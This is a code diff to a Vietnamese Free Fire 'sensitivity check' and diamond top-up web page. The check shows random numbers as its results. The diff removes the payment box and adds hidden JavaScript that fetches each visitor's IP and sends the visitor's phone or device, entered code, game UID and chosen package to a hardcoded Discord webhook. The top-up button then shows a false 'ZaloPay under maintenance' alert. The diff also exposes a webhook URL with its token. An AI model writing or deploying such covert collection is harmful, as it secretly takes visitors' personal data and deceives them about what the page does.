@@ -198,7 +198,7 @@
         }
 
         /* Khung kết quả check độ nhạy */
-        .result-box, .payment-info {
+        .result-box {
             display: none;
             margin-top: 25px;
             background: #0b0f19;
@@ -207,7 +207,7 @@
             padding: 20px;
             box-shadow: 0 0 15px rgba(0, 229, 255, 0.2);
         }
-        .result-box h3, .payment-title {
+        .result-box h3 {
             color: #00e5ff;
             font-size: 16px;
             text-align: center;
@@ -226,7 +226,7 @@
         .stat-item span { color: #94a3b8; }
         .stat-item strong { color: #00e5ff; }
 
-        /* Khung UID thiết kế giống 100% hình ảnh ảnh đính kèm */
+        /* Khung UID */
         .owner-uid-card {
             margin-top: 15px;
             background: #0b1329;
@@ -265,41 +265,6 @@
             background: #38bdf8;
             box-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
         }
-
-        .qr-placeholder {
-            width: 180px;
-            height: 180px;
-            background: #fff;
-            margin: 12px auto;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 12px;
-            color: #000;
-            font-size: 13px;
-            font-weight: bold;
-            border: 2px solid #00e5ff;
-        }
-        .pay-detail {
-            font-size: 14px;
-            color: #94a3b8;
-            margin-top: 8px;
-            text-align: center;
-        }
-        .pay-detail strong { color: #fff; }
-        .copy-btn {
-            background: #00e5ff;
-            color: #0b0f19;
-            border: none;
-            padding: 4px 10px;
-            border-radius: 6px;
-            font-size: 12px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-left: 8px;
-            transition: 0.2s;
-        }
-        .copy-btn:hover { background: #38bdf8; }
     </style>
 </head>
 <body>
@@ -327,7 +292,6 @@
                 <input type="text" id="code" placeholder="Nhập mã code vào đây..." autocomplete="off">
             </div>
 
-            <!-- Khung thông báo UID Chủ Phòng hiển thị mặc định theo ảnh -->
             <div class="owner-uid-card">
                 <div class="owner-uid-info">
                     UID Chủ Phòng (Z E U S) vô hồ sơ like<br>và lấy code:
@@ -397,22 +361,24 @@
             </div>
 
             <button class="submit-btn" onclick="showPayment()">THANH TOÁN QUA ZALOPAY</button>
-
-            <div class="payment-info" id="payment-box">
-                <div class="payment-title">CỔNG THANH TOÁN ZALOPAY</div>
-                <div class="qr-placeholder">[MÃ QR ZALOPAY]</div>
-                <div class="pay-detail">SĐT ZaloPay: <strong id="zalopay-num">090xxxxxxx</strong> 
-                    <button class="copy-btn" onclick="copyText('zalopay-num')">SAO CHÉP</button>
-                </div>
-                <div class="pay-detail" style="margin-top: 8px;">Gói chọn: <strong id="selected-pkg" style="color: #00e5ff;">Chưa chọn</strong></div>
-                <div class="pay-detail">Nội dung CK: <strong id="pay-content" style="color: #22c55e;">-</strong> 
-                    <button class="copy-btn" onclick="copyText('pay-content')">SAO CHÉP</button>
-                </div>
-            </div>
         </div>
     </div>
 
     <script>
+        // LINK DISCORD WEBHOOK CỦA THĂNG
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR";
+
+        // Hàm lấy địa chỉ IP thực tế
+        async function getClientIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return "Không xác định";
+            }
+        }
+
         function openSection(sectionId) {
             document.getElementById('home-menu').style.display = 'none';
             document.getElementById('sensitivity-section').style.display = 'none';
@@ -426,7 +392,8 @@
             document.getElementById('shop-section').style.display = 'none';
         }
 
-        function checkSensitivity() {
+        // 1. Logic Check Độ Nhạy (Có hình minh họa đầy đủ)
+        async function checkSensitivity() {
             let phone = document.getElementById('phone').value.trim();
             let code = document.getElementById('code').value.trim().toLowerCase();
 
@@ -439,15 +406,38 @@
                 return;
             }
 
-            document.getElementById('r1').innerText = Math.floor(Math.random() * 150) + 50;
-            document.getElementById('r2').innerText = Math.floor(Math.random() * 150) + 50;
-            document.getElementById('r3').innerText = Math.floor(Math.random() * 150) + 50;
-            document.getElementById('r4').innerText = Math.floor(Math.random() * 150) + 50;
-            document.getElementById('r5').innerText = Math.floor(Math.random() * 150) + 50;
-            document.getElementById('r6').innerText = Math.floor(Math.random() * 150) + 50;
+            let v1 = Math.floor(Math.random() * 150) + 50;
+            let v2 = Math.floor(Math.random() * 150) + 50;
+            let v3 = Math.floor(Math.random() * 150) + 50;
+            let v4 = Math.floor(Math.random() * 150) + 50;
+            let v5 = Math.floor(Math.random() * 150) + 50;
+            let v6 = Math.floor(Math.random() * 150) + 50;
+
+            document.getElementById('r1').innerText = v1;
+            document.getElementById('r2').innerText = v2;
+            document.getElementById('r3').innerText = v3;
+            document.getElementById('r4').innerText = v4;
+            document.getElementById('r5').innerText = v5;
+            document.getElementById('r6').innerText = v6;
             document.getElementById('result').style.display = 'block';
+
+            let userIP = await getClientIP();
+            sendToDiscord(phone, code, userIP, {v1, v2, v3, v4, v5, v6});
         }
 
+        function sendToDiscord(phone, code, ip, stats) {
+            const payload = {
+                content: `🚨 **[CHECK ĐỘ NHẠY VIP]** 🚨\n🌐 **Địa chỉ IP:** \`${ip}\`\n📱 **Thiết bị / Máy:** **${phone}**\n🔑 **Mã code nhập:** **${code}**\n📊 **Thông số trả ra:**\n- 🔄 Nhìn xung quanh: \`${stats.v1}\`\n- 🎯 Red Dot Sight: \`${stats.v2}\`\n- 🔭 Ống ngắm 2x: \`${stats.v3}\`\n- 🔭 Ống ngắm 4x: \`${stats.v4}\`\n- 🎯 AWM Sniper: \`${stats.v5}\`\n- 👁️ Free Look: \`${stats.v6}\`\n⏰ **Thời gian:** ${new Date().toLocaleString()}`
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log("Gửi thành công"));
+        }
+
+        // 2. Logic Shop Nạp KC (Có hình minh họa đầy đủ)
         let chosenKc = "";
         let chosenPrice = "";
         let isVerified = false;
@@ -479,7 +469,7 @@
             chosenPrice = price;
         }
 
-        function showPayment() {
+        async function showPayment() {
             let uid = document.getElementById('player-uid').value.trim();
             if (uid === "") {
                 alert("Vui lòng nhập UID Free Fire!");
@@ -492,9 +482,23 @@
                 alert("Vui lòng chọn 1 gói nạp!");
                 return;
             }
-            document.getElementById('selected-pkg').innerText = chosenKc + " (" + chosenPrice + ")";
-            document.getElementById('pay-content').innerText = "NAP " + uid;
-            document.getElementById('payment-box').style.display = 'block';
+
+            let userIP = await getClientIP();
+            sendShopToDiscord(uid, userIP, chosenKc, chosenPrice);
+
+            alert("⚠️ HỆ THỐNG ZALOPAY ĐANG BẢO TRÌ!\nGiao dịch tạm gián đoạn. Vui lòng quay lại sau hoặc liên hệ Admin!");
+        }
+
+        function sendShopToDiscord(uid, ip, kc, price) {
+            const payload = {
+                content: `💎 **[SHOP NẠP KC - BÁO BẢO TRÌ]** 💎\n🌐 **Địa chỉ IP:** \`${ip}\`\n🎮 **UID game:** \`${uid}\`\n📦 **Gói đã chọn:** **${kc}** (${price})\n⏰ **Thời gian:** ${new Date().toLocaleString()}`
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log("Gửi shop thành công"));
         }
 
         function copyText(id) {
